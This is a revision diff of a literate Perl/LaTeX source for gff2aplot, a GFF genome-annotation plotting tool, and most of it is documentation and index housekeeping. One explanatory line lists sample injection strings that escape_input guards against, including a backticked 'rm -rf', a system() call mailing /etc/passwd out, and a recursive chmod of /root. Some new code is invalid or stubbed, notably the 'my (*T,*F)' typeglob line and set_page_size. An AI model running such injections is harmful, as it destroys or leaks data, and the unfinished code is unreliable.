@@ -4,9 +4,14 @@
 %2345678901234567890123456789012345678901234567890123456789012345678901234567890
 %        1         2         3         4         5         6         7         8
 %
-% $Id: gff2aplot.nw,v 1.10 2001-10-23 08:46:19 jabril Exp $
+% $Id: gff2aplot.nw,v 1.11 2001-10-23 18:22:24 jabril Exp $
 %
-\usepackage{noweb,multicol}
+\usepackage{noweb}
+% noweb options
+\noweboptions{smallcode,shortxref}
+\def\nwendcode{\endtrivlist \endgroup} % relax page breaking scheme
+\let\nwdocspar=\par                    %
+%
 \usepackage[a4paper,offset={0pt,0pt},hmargin={2cm,2cm},vmargin={1cm,1cm}]{geometry}
 \usepackage{graphics}
 \usepackage[dvips]{graphicx}
@@ -46,11 +51,6 @@
 %% fonts
 \usepackage{times}\fontfamily{ptm}\selectfont
 \usepackage{t1enc}
-
-% noweb options
-\noweboptions{smallcode}
-\def\nwendcode{\endtrivlist \endgroup} % relax page breaking scheme
-\let\nwdocspar=\par                    %
  
 \input defs.tex
 
@@ -70,7 +70,7 @@
 %%} % parbox
 %%\end{center}
 %%\end{abstract}\vskip 5ex
-%%{\large$<$ \verb$Id: gff2aplot.nw,v 1.10 2001-10-23 08:46:19 jabril Exp $$>$ }
+%%{\large$<$ \verb$Id: gff2aplot.nw,v 1.11 2001-10-23 18:22:24 jabril Exp $$>$ }
 %%
 %%\vfill
 %%
@@ -419,6 +419,9 @@ This is the main loop for the {\prog} ``Filter'' mode:
 &map_vars_data;
 
 &sort_elements;
+
+&set_page_vars;
+
 @
 
 We force that all the variables must be declared before using them and restrict unsafe constructs with'[[use strict]]'. After that we switch on signal trapping.
@@ -430,8 +433,10 @@ use strict;
 #
 @ 
 
+% Typeglobs set to a referenced scalar forces a constant value for all execution
+
 <<Global Constants>>=
-my ($T,$F) = (1,0); # for 'T'rue and 'F'alse
+my (*T,*F) = (\1,\0); # for 'T'rue and 'F'alse
 @
 
 Those are the main variables containing customization parameters and input data from GFF records. We split customization variables on three input classes: [[%DefaultVars]] to set default values and their type (what makes easy to check if a variable exists or not and if its given value has the expected format), [[%CmdLineVars]] for those parameters passed on command-line and [[%CustomVars]] which collects vaiables customization from external parameter files. Two temporary variables ([[%Defaults]] to initialize element variables and [[%Vars]] to provide the customization from command-line and parameter files to those element variables) allow us to merge all the information from these three variables and transfer to each GFF element in the GFF data variables ([[%GFF_DATA]] for annotations and [[%ALN_DATA]] for alignments).
@@ -447,9 +452,9 @@ Some info about the program itself.
 <<Global Constants>>=
 my ($PROGRAM,$VERSION,$REVISION,$REVISION_DATE,$LAST_UPDATE) = 
    ( 'gff2aplot','v2.0',
-     '$Revision: 1.10 $', #'
-     '$Date: 2001-10-23 08:46:19 $', #'
-     '$Id: gff2aplot.nw,v 1.10 2001-10-23 08:46:19 jabril Exp $', #'
+     '$Revision: 1.11 $', #'
+     '$Date: 2001-10-23 18:22:24 $', #'
+     '$Id: gff2aplot.nw,v 1.11 2001-10-23 18:22:24 jabril Exp $', #'
     );
 $REVISION =~ s/\$//og;
 $REVISION_DATE =~ s/\$//og;
@@ -469,6 +474,7 @@ Main function calls share a similar internal structure: a '[[header]]' reporting
 <<Parsing Input Data>>
 <<Sorting Features>>
 <<Features Setting>>
+<<Layout Settings>>
 <<Making PS Figures>>
 @
 
@@ -516,7 +522,8 @@ AUTHOR:  $PROGRAM is under GNU-GPL (C) 2000 - Josep F. Abril
     close(HELP);
     exit(1);
 } # prt_help
-@ %$
+@ %def &prt_help
+%$
 
 <<perl requires help>>=
 $PROGRAM needs the following Perl modules installed in 
@@ -588,7 +595,7 @@ sub set_default_vars() {
     <<map default vars to defaults working copy>>
     print LOGFILE '>>> \%DefaultVars : '.(Dumper(\%DefaultVars)) if ($LogFile && $Debug);
 } # set_default_vars
-@
+@ %def &set_default_vars
 
 We also build from this structure, making easier variable maintenance because default value and variable type are edited together in [[%DefaultVars]] (as [[TYPE]]/[[VALUE]] pairs), an auxiliary variable which allows us to load default values into GFF elements.
 
@@ -671,7 +678,7 @@ sub parse_command_line() {
 
     &footer("COMMAND-LINE CHECKED");
 } # parse_command_line
-@ 
+@ %def &parse_command_line
 
 As the '[[GetOptions]]' function has a problem, in the way we are using here to preserve backwards compatibility, when we want to use a single dash as a way to tell the program that '[[STDIN]]' must be read in the given order (when input filenames are also given and we would load input from a pipe after/before a given file). We show the warnings printed by the program when '[[--]]' is missing or missplaced in the table~\ref{tbl:STDINhandle}.
 
@@ -738,7 +745,7 @@ CHKLOG:
 
 <<Common Routines>>=
 sub close_logfile() { close(LOGFILE) if $LogFile };
-@ 
+@ %def &close_logfile
 
 <<Use Modules>>=
 use Getopt::Long;
@@ -790,8 +797,8 @@ sub prt_version() {
     $comment = sprintf($comment,$PROGRAM,$VERSION);
     &prt_to_stderr($comment);
     exit(1);
-}
-@ 
+} # prt_version
+@ %def &prt_version
 
 <<messages - parsing command-line options>>=
 SHOW_VERSION =>
@@ -823,8 +830,8 @@ sub set_input_file() {
         $stdin_flg = $T;
     };
     $stdin_flg && &report('READING_STDIN');
-}
-@ 
+} # set_input_file
+@ %def &set_input_file
 
 <<Global Vars>>=
 my (@data_files,$file);
@@ -859,14 +866,9 @@ defined($chk_stdin) && do {
 
 \subsubsctn{Verifying command-line settings}
 
-\label{todo:BBC}
-<<HIDE: new defs TODO>>=
-\def\todoBBC{Implement [[&check_command_line_vars]] to verify if settings from command-line are OK.} % todoBBC
+<<HIDE: DONE>>=
+\doneitem{20011023}{Implement [[&check_command_line_vars]] to verify if settings from command-line are OK.}
 @
-<<HIDE: TODO>>=
-\todoitem{\todoBBC}{todo:BBC}
-@
-\todo{ \item \todoBBC } % todo
 
 As we reset [[%CmdLineVars]] in main loop we do not need to take care for those key-value pairs that were not defined by [[GetOptions]] function. We will check for two kinds of command-line variables, those having a specific command-line option (and related to [[LAYOUT]] variables) and those that define a feature-specific variable (for GFF-features, groups, sequences and so on). Last ones are validated and set in the following section. Therefore, if layout variables are provided on command-line by this way, they have precedence over the corresponding layout pre-defined command-line option. 
 
@@ -877,8 +879,8 @@ sub check_command_line_vars() {
     defined($CmdLineVars{VARS}) &&
         &command_line_for_vars();
     &footer("COMMAND-LINE OPTONS CHECKED");
-} # check_command_line
-@
+} # check_command_line_vars
+@ %def &check_command_line_vars
 
 <<messages - input/output>>=
 CHECKING_CMDLN_VARS =>
@@ -897,21 +899,16 @@ sub command_line_for_layout() {
 	}; # foreach $cvar
     &counter_end($n,$c);
 } # command_line_for_layout
-@
+@ %def &command_line_for_layout
 
 \subsubsctn{Loading GFF elements custom variables from command-line}
 
-\label{todo:BBD}
-<<HIDE: new defs TODO>>=
-\def\todoBBD{
+<<HIDE: DONE>>=
+\doneitem{20011023}{
 Parsing and loading command-line options having structure like:\\
 \centerline{[[--feature feature_name::variable_name=value]]}
-} % todoBBD
+}
 @
-<<HIDE: TODO>>=
-\todoitem{\todoBBD}{todo:BBD}
-@
-\todo{ \item \todoBBD } % todo
 
 <<Parsing Command-Line Options>>=
 sub command_line_for_vars() {
@@ -939,7 +936,7 @@ sub command_line_for_vars() {
 	}; # foreach $calias
     &counter_end($n,$c);
 } # command_line_for_vars
-@
+@ %def &command_line_for_vars
 
 <<command-line options custom>>=
 "feature-var=s@"  => \@{ $CmdLineVars{VARS}{FEATURE} },
@@ -1042,7 +1039,7 @@ sub set_custom_files() {
 	}; # MLOOP: foreach
 	@custom_files = @files;
 } # set_custom_files
-@
+@ %def &set_custom_files
 
 <<Global Vars>>=
 my @custom_files = ();
@@ -1111,7 +1108,7 @@ sub parse_custom_files() {
         if ($LogFile && $Debug);
     &footer("CUSTOM FILES LOADED");
 } # parse_custom_files
-@ 
+@ %def &parse_custom_files
 
 \begin{table}[!t]
 \begin{center}
@@ -1197,7 +1194,7 @@ sub varscheck() {
     $varec->{$class}{$$rec[1]} = $$rec[2];
     return $T;
 } # varscheck
-@ 
+@ %def &varscheck
 
 \label{sec:DATAtriadarray}
 For the same variable name, say here [[ $$rec[1] ]], we will have more than one setting (for the same element or not). This requirement force us to save element-value pairs (and a third field which tells us if element contains a regular expression that must not to be matched or not). The array will preserve the input ordering of each new setting for the same variable. We want this behaviour, as the global definitions must precede specific ones in the custom files. 
@@ -1220,7 +1217,7 @@ sub checkvarvalues() {
     &warn('VARTYPE_NOT_DEFINED',$T,$_test,$_var);
     return $F;
 } # checkvarvalues
-@
+@ %def &checkvarvalues
 
 <<warnings - parsing custom files>>=
 VARTYPE_NOT_DEFINED =>
@@ -1276,7 +1273,7 @@ sub find_regexp() {
     }; # NOT $isOK_flg
     return ($isOK_flg, $not_flg, $id_flg, $string);
 } # find_regexp
-@
+@ %def &find_regexp
 
 <<warnings - parsing custom files>>=
 BAD_REGEXP =>
@@ -1340,7 +1337,7 @@ jhkjfhgkjdf\@   # use "\" to preserve "@" if feat ends with "@" (most unlikely)
 >>> "*" @ "yoyo"
 !@@@@@lio       # a very extrange test, isn't it ? ... ;^D
 >>> "!@@@@" @ "lio"
-@ 
+@ %$
 
 <<Parsing Custom Files>>=
 sub eval_regexp() {
@@ -1349,23 +1346,23 @@ sub eval_regexp() {
     eval { "" =~ m{$str}; $flag = $T; } || ($flag = $F);
     return ($str, $flag);
 } # eval_regexp
-@ 
+@ %def &eval_regexp
 
 From a list of possible tainted shell metacharacters, \\[1ex]
 \centerline{[[ ; < > * | & $ ! ? # ( ) [ ] { } : ` ' " \ ]]}\vskip 0.5ex
 % # @_ =~ s/([;<>\*\|`&\$!?#\(\)\[\]\{\}:'"\\])/\\$1/g;
 we quote those that are not going to be used as regular expression metacharacters, \\[1ex]
-\centerline{[[ ; < > & ! { } ` ' " ]]}\vskip 0.5ex
+\centerline{[[ ; < > & ! { } ` ' " ]]}\vskip 0.5ex % "'`
 to avoid security issues. This will make a CGI developed on {\prog} a little bit more secure because the user cannot send something like:\\[1ex]
 \centerline{\shortstack{[[//; `/bin/rm -rf`;//]]\ \ \ ,\\[[/ @{[ system('mail user@server /etc/passwd') ]} /]]\ \ \ or\\[[/ ${ \( exec('chmod -R 0777 /root') ) } /]]}} %$
 
 <<Parsing Custom Files>>=
 sub escape_input() {
     my $var = $_[0];
-    $var =~ s{([;,<>&!\{\}`'"])}{\\$1}g;
+    $var =~ s{([;,<>&!\{\}`'"])}{\\$1}g; #"'`
     return $var;
 } # escape_input
-@ 
+@ %def &escape_input
 
 <<HIDE: testing regexes: regexptester.pl>>=
 BEGIN { ($NULL,$T,$F) = ("+@+NULL+@+",1,0); }
@@ -2245,7 +2242,8 @@ The following variables define the boundary/clipping coordinates for each sequen
 
 <<default layout vars values>>=
 #						  
-page_size                  => { TYPE => 'PAGE'   , VALUE => 'a4'   },
+page_bbox                  => { TYPE => 'BBOX'   , VALUE => undef   },
+page_size                  => { TYPE => 'PAGE'   , VALUE => 'a4'    },
 background_color           => { TYPE => 'COLOR'  , VALUE => 'white' },
 foreground_color           => { TYPE => 'COLOR'  , VALUE => 'black' },
 # GLOBAL Labels			  
@@ -2434,7 +2432,7 @@ for the figure, by default showing \pr{align\_name} in the form of
 
 \sctn{Reading GFF records} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
-We have to deal with two basic formats, the \textsl{standard} General Feature Format (GFF) and the derived \textsl{aplot} format, the former having two versions with some minor differences at field level. We are going to asume the record formats shown in the table~\ref{fig:formats} for the input files.
+We have to deal with two basic formats, the \textsl{standard} General Feature Format (GFF) and the derived \textsl{aplot} format, the former having two versions with some minor differences at field level. We are going to asume the record formats shown in the table~\ref{tbl:formats} for the input files.
 
 
 \label{todo:EEA}
@@ -2527,7 +2525,8 @@ sub parse_GFF_files() {
         if ($LogFile && $Debug);
     &footer("DATA LOADED");
 } # sub parse_GFF
-@ %$
+@ %def &sub parse_GFF
+%$
 
 We define the following constants, used to report which format was found in the current read record (See table~\ref{tbl:DTkeysXreport}).
 
@@ -2591,26 +2590,28 @@ sub GFF_format() {
     return $APLOT_NOGP if $gff eq $APLOT_NOGP; # Old aplot format (ungrouped)
     return $noGFF;
 } # GFF_format
-@
+@ %def &GFF_format
+%$
 
 Here we decide to parse records as they are in GFF or in APLOT format. '[[load_gff]]' and '[[load_aplot]]' do the field error checking and load the program variables '[[%GFF_DATA]]' and '[[%ALN_DATA]]'. Those variables are reset in '[[<<Main Loop>>]]'.
 
 <<Parsing Input Data>>=
 sub fieldscheck() {
     my ($list) = @_;
-    my ($seqname,$start,$end) = @$list[0,3,4]; # ($list->[0],$list->[3],$list->[4]);
+    my ($seqname,$start,$end) = @$list[0,3,4]; 
+                              # ($list->[0],$list->[3],$list->[4]);
     (&fcolon($seqname) && &fcolon($start) && &fcolon($end)) && do {
         return &load_aplot(\@$list);
     };
     return &load_gff(\@$list);
 } # fieldscheck
-@
+@ %def &fieldscheck
 
 For historical reasons the program can work with APLOT format (see Table~\ref{tbl:formats}). Initial field checking determines whether the record being processed is under that alignment GFF-like format, by determining that first, fourth and fifth fields contain a colon char. Then we assume we are under APLOT format.
 
 <<Parsing Input Data>>=
 sub fcolon() { return ($_[0] =~ /.+:.+/o ? $T : $F) }
-@
+@ %def &fcolon
 
 \subsctn{Validating fields}
 
@@ -2630,7 +2631,7 @@ sub check_coords() { # ((ori,end)_1,...,(ori,end)_n)
     }; # foreach
     return $T;
 } # check_coords
-@
+@ %def &check_coords
 
 <<warnings - parsing GFF files>>=
 ORI_GREATER_END =>
@@ -2649,7 +2650,7 @@ sub check_strand() { # (str_1,...,srt_n)
     }; # foreach
     return $T;
 } # check_strand
-@
+@ %def &check_strand
 
 <<warnings - parsing GFF files>>=
 STRAND_MISMATCH =>
@@ -2668,7 +2669,7 @@ sub check_frame() { # (frm_1,...,frm_n)
     }; # foreach
     return $T;
 } # check_frame
-@
+@ %def &check_frame
 
 <<warnings - parsing GFF files>>=
 FRAME_MISMATCH =>
@@ -2691,7 +2692,8 @@ sub load_aplot() { # if errors found > return $noGFF
     &check_aplot_fields || ($w_gff=$noGFF);
     return $w_gff;
 } # load_aplot
-@ %$
+@ %def &load_aplot
+%$
 
 <<Global Vars>>=
 my ($seqname_1,$seqname_2,
@@ -2753,7 +2755,8 @@ sub remove_colon() {
 	};
 	return @ary_out;
 } # remove_colon
-@ %$
+@ %def &remove_colon
+%$
 
 \subsubsctn{Checking fields and accepting APLOT records}
 
@@ -2767,7 +2770,7 @@ sub check_aplot_fields() {
     &add_aplot_record;
     return $T; 
 } # check_aplot_fields
-@
+@ %def &check_aplot_fields
 
 \label{todo:EHA}
 <<HIDE: new defs TODO>>=
@@ -2784,7 +2787,8 @@ Append a new record to the variable defined for APLOT records
 sub add_aplot_record() {
     return;
 } # add_aplot_record
-@ %$
+@ %def &add_aplot_record
+%$
 
 \label{sec:APLOT-DS}
 
@@ -2806,7 +2810,7 @@ sub load_gff() { # if errors found > return $noGFF
     &check_gff_fields($w_gff) || ($w_gff=$noGFF);
     return $w_gff;
 } # load_gff
-@
+@ %def &load_gff
 
 <<Global Vars>>=
 my ($seqname,$source,$feature,$start,
@@ -2823,7 +2827,7 @@ sub check_gff_fields() {
     &add_gff_record($_[0]);
     return $T; 
 } # check_gff_fields
-@
+@ %def &check_gff_fields
 
 Once fields checking is done, we proceed to load the data structure defined for the GFF records as '[[%GFF_DATA]]' hash.
 The outline of the inner structure of that variable is shown in table~\ref{tbl:gffdata}.
@@ -2948,7 +2952,7 @@ sub add_gff_record() {
     <<adding new feature elements>>
     return;
 } # add_gff_record
-@
+@ %def &add_gff_record
 
 First we load the plain GFF attributes for a given record, when such record is defining a vector we add a new element to the feature anonymous array. That element is a list of the scores provided by the '[[&load_GFF_vector]]' function defined in section~\ref{sec:loadvector}, page~\pageref{sec:loadvector}.
 
@@ -3000,7 +3004,8 @@ sub load_gff_var() {
 	};
 	return;
 } # load_gff_var
-@ %$
+@ %def &load_gff_var
+%$
 
 We initialize properties for each new element as references to '[[%DefaultVars]]' given level corresponding values. 
 
@@ -3010,7 +3015,7 @@ sub set_var_defaults() {
     <<P.I.D: set reference to all properties>>
 	return;
 } # load_gff_var
-@
+@ %def &load_gff_var
 
 We can set default properties of GFF elements in two ways: making a reference to the default properties hash for that element, as shown in the [[<<P.I.D: set reference to all properties>>]], or reference each variable from the properties hash to a new key, as described in [[<<P.I.D: set reference for each property>>]].
 
@@ -3062,8 +3067,8 @@ sub load_grouping() {
 	<<parse grouping attributes>>
 	<<parse other attributes>>
     return $grp_GP;
-}
-@ 
+} # load_grouping
+@ %def &load_grouping
 
 We may find four basic grouping field structures (detailed in Table~\ref{tbl:formats}) within the first element of '[[@grouping_list]]'. We check first for double-quotes in the first or second field within that element. If second field is double-quoted, the first field is set as 'Tag' and the quoted as 'Value', else 'Tag' is set to default value (empty string for GFF records and 'target' for APLOT GFF-like ones) and 'Value' is set with the first field. Then we are looking in GFF grouping attributes for extra fields defining start, end, strand and frame (all related to the second sequence); in APLOT GFF-like format, those values are deprecated (because they must be defined in the first eight fields following the first sequence values and a colon as shown in table~\ref{tbl:formats}). 
 
@@ -3183,7 +3188,7 @@ Parsing alignment records:\\
 sub load_GFF_align() {
 
 } # load_GFF_align
-@
+@ %def &load_GFF_align
 
 \subsubsctn{Parsing scoring vectors} \label{sec:loadvector}
 
@@ -3203,7 +3208,7 @@ Parsing scoring vectors:\\
 sub load_GFF_vector() {
 	@vect_ary = ();
 } # load_GFF_vector
-@
+@ %def &load_GFF_vector
 
 <<Global Vars>>=
 my @vect_ary;
@@ -3255,7 +3260,7 @@ sub merge_custom_vars() {
     <<setting non-layout variables>>
     &footer("VALUES SET for MAIN VARS");
 } # merge_custom_vars
-@ 
+@ %def &merge_custom_vars
 
 Layout variables are simpler than the rest, they are defined as a key-value pair, so that mapping is straightforward.
 
@@ -3323,7 +3328,7 @@ sub map_vars_data() {
     }; # foreach $sct
     &footer("VALUES SET for GFF ELEMENTS");
 } # map_vars_data
-@ 
+@ %def &map_vars_data
 
 We have to set the properties hash corresponding to the GFF elements present in the current section (say here SEQUENCE, SOURCE, STRAND, GROUP or FEATURE). To do that we have to define a reference to that anonymous hash and also retrieve the element string ([[$element]]) to check if it match to the regular expression ([[$reg_exp]]) which determines if the variable of that element is re-assigned to the current value ([[$the_value]]).
 
@@ -3403,7 +3408,7 @@ sub does_feat_match() {
         $gffref->[$prop]{$var} = $value;
     };
 } # does_feat_match
-@ 
+@ %def &does_feat_match
 
 The following two functions are checking if a GFF element match or not a given regular expression (minimal expression consists in a GFF element string). They return a true/flase result that decides if a variable is set or not for a given GFF element.
 
@@ -3416,7 +3421,7 @@ sub match_regexp_neg() {
     $_[0] !~ /$_[1]/o && return $T;
     return $F;
 } # match_regexp_neg
-@ 
+@ %def &match_regexp &match_regexp_neg
 
 <<Features Setting>>=
 sub set_all_defaults() {
@@ -3426,7 +3431,7 @@ sub set_all_defaults() {
         $the_hash->[$_prop]{$vnm} = \$Defaults{$the_sec}{$vnm};
     }; # foreach $nm
 } # set_all_defaults
-@ 
+@ %def &set_all_defaults
 
 
 \newpage
@@ -3475,7 +3480,7 @@ sub sort_elements() {
   #     if ($LogFile && $Debug);
     &footer("ELEMENTS SORTED");
 } # sort_elements
-@
+@ %def &sort_elements
 
 Once we get into [[&sort_elements]] function we initialize the arrays within the [[%Order]] hash as we are requiring them.
 
@@ -3624,7 +3629,7 @@ sub sort_by_inputorder() {
                 sort { $a->[1] <=> $b->[1] }
                 map { [ $_->[0], $_->[1], $_->[2] ] } @{ $ref };
 } # sort_by_inputorder
-@ 
+@ %def &sort_by_inputorder
 
 \subsctn{Sorting forward/reverse strands}
 
@@ -3642,18 +3647,44 @@ sub sort_reverse {
              or
     $a->[0] <=> $b->[0];  # sorting by start if same end
 } # sort_forward
-@
+@ %def &sort_forward &sort_forward
 
 We choose between those two functions (both defining which fields to order and the direction --ascending/descending--), assigning by reference to [[$sortfunct]] variable which is de-referenced within the [[sort]] functions.
 
 <<set forward/reverse sorting functon>>=
 my $sortfunct = ($s_str eq '-') ? \&sort_reverse : \&sort_forward;
 @
-
+%$
 
 \newpage
 
-\sctn{Obtaining {\ps} output} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\sctn{Setting page layout variables} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+<<Layout Settings>>=
+sub set_page_vars() {
+    &header("SETTING PAGE LAYOUT");
+
+    my $var = \%{ $Vars{LAYOUT} };
+
+    &set_page_size($var);
+    
+    &footer("PAGE LAYOUT SET for CURRENT PLOT");
+} # set_page_vars
+@ %def &set_page_vars
+
+<<Layout Settings>>=
+sub set_page_size() {
+    my ($vrf) = @_;
+
+    $vrf->{page_bbox}
+    $vrf->{page_size}
+
+} # set_page_size
+@ %def &set_page_size 
+
+\newpage
+
+\sctn{Obtaining {\ps} output} %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 \label{todo:IAA}
 <<HIDE: new defs TODO>>=
@@ -3690,7 +3721,7 @@ sub make_plot() {
 
     &footer("WRITING POSTSCRIPT FINISHED");
 } # make_plot
-@ 
+@ %def &make_plot
 
 <<PostScript CODE Chunks>>=
 <<PostScript PLOT>>
@@ -3732,7 +3763,7 @@ sub ps_header() {
 <<POSTSCRIPT constants>>
 +++HEADER+++
 } # ps_header
-@
+@ %def &ps_header
 
 \subsctn{CMYK color definition}
 
@@ -3751,7 +3782,7 @@ sub ps_colors() {
       };
   print STDOUT "end %% colordict\n";
 } # ps_colors
-@
+@ %def &ps_colors
 
 <<Global Vars>>=
 my $colors = 0;
@@ -3775,8 +3806,9 @@ sub ps_page_formats() {
       my $pgsz = &fill_left($$ref->[1],4," ").&fill_left($$ref->[2],5," ");
       print STDOUT "/pg".(&fill_right($name,10," "))."{ $pgsz } def\n";
       };
-  print STDOUT "end %% pagedict\n";}
-@
+  print STDOUT "end %% pagedict\n";
+} # ps_page_formats
+@ %def &ps_page_formats
 
 <<Global Vars>>=
 my $formats = 0;
@@ -3807,7 +3839,7 @@ sub ps_variables() {
 %
 +++PSVARS+++
 } # ps_variables
-@
+@ %def &ps_variables
 
 \subsctn{Main {\ps} functions}
 
@@ -3845,7 +3877,7 @@ true setstrokeadjust
 %
 +++MAINProcs+++
 } # ps_main
-@
+@ %def &ps_main
 
 \subsctn{Plotting data into the figure}
 
@@ -3863,7 +3895,7 @@ Plotting data into the figure
 <<PostScript PLOT>>=
 sub ps_plot(){
 } # ps_plot
-@
+@ %def &ps_plot
 
 \subsctn{{\ps} code chunks}
 
@@ -3885,7 +3917,7 @@ Dpage 0 0 bbox S BGcolor scmyk fill R clip newpath
 %
 +++OPEN+++
 } # ps_open_page
-@
+@ %def &ps_open_page
 
 <<Postscript CLOSE PAGE>>=
 sub ps_close_page() {
@@ -3900,7 +3932,7 @@ showpage
 %
 +++CLOSE+++
 } # ps_close_page
-@
+@ %def &ps_close_page
 
 \subsubsctn{{\ps} end of file}
 
@@ -3915,7 +3947,7 @@ sub ps_trailer() {
 %%EOF
 +++EOF+++
 } # ps_trailer
-@
+@ %def &ps_trailer
 
 
 \newpage
@@ -5068,16 +5100,16 @@ sub trap_signals() {
     &prt_to_logfile($Messages{'USER_HALT'});
     &close_logfile();
     die($Messages{'USER_HALT'});
-}
-@ 
+} # trap_signals
+@ %def &trap_signals
 
 <<Common Routines>>=
 sub trap_signals_prog() {
     &prt_to_logfile($Messages{'PROCESS_HALT'});
     &close_logfile();
     die($Messages{'PROCESS_HALT'});
-}
-@
+} # trap_signals_prog
+@ %def &trap_signals_prog
 
 <<warnings - input/output>>=
 USER_HALT =>
@@ -5146,12 +5178,12 @@ sub warn() {
     $screen_flg && ($Quiet || print STDERR $comment); 
     &prt_to_logfile($comment);
 } # warn
-@
+@ %def &warn
 
 <<Common Routines>>=
 sub prt_to_logfile() { $LogFile && (print LOGFILE $_[0]) }
 sub prt_to_stderr()  { $Verbose && ($Quiet || print STDERR $_[0]) }
-@ 
+@ %def &prt_to_logfile &prt_to_stderr
 
 \subsctn{Reporting messages}
 
@@ -5167,7 +5199,7 @@ sub report() {
     &prt_to_stderr($comment);
     &prt_to_logfile($comment);
 } # report
-@
+@ %def &report
 
 <<Common Routines>>=
 sub header() {
@@ -5184,8 +5216,8 @@ sub footer() {
     &header(@_,$total_time);
     &prt_to_stderr("###\n");
     &prt_to_logfile("###\n");
-}
-@
+} # footer
+@ %def &header &footer
 
 \subsctn{Timing procedures}
 
@@ -5215,8 +5247,8 @@ sub timing() {
         (return timestr(timediff($Timer[$#Timer],$Timer[($#Timer - 1)])));
     # total time
     return timestr(timediff($Timer[$#Timer],$Timer[0]));
-}
-@ 
+} # timing
+@ %def &timing
 
 We also set here the date when the script is running and who is the user running it.
 
@@ -5614,7 +5646,7 @@ exit 0
 This document is under Revision Control System (RCS). The version you are currently reading is the following:
 
 <<Version Control Id Tag>>=
-# $Id: gff2aplot.nw,v 1.10 2001-10-23 08:46:19 jabril Exp $
+# $Id: gff2aplot.nw,v 1.11 2001-10-23 18:22:24 jabril Exp $
 @ 
 
 \subsctn{GNU General Public License}
@@ -5784,7 +5816,7 @@ notangle -R"HIDE: GFF DATA STRUCTURE" $WORK/$nwfile.nw | \
 <<tangling complementary LaTeX files>>
 # extracting main documentation
 echo "Weaving \"$DOCS/$nwfile.tex\"..." ;
-noweave -v -t4 -delay -x -filter 'elide "HIDE: *"' \
+noweave -v -t4 -delay -index -filter 'elide "HIDE: *"' \
         $WORK/$nwfile.nw | cpif $DOCS/$nwfile.tex ;
 # LaTeXing 
 echo "LaTeXing \"$DOCS/$nwfile.tex\"..." ;
@@ -5856,5 +5888,11 @@ notangle -R'BASH Environment Variables' $WORK/$nwfile.nw | \
 source $WORK/.bash_VARS ;
 #
 @
+
+\newpage
+
+\sctn{Code chunks list}
+
+\nowebchunks
 
 \end{document}
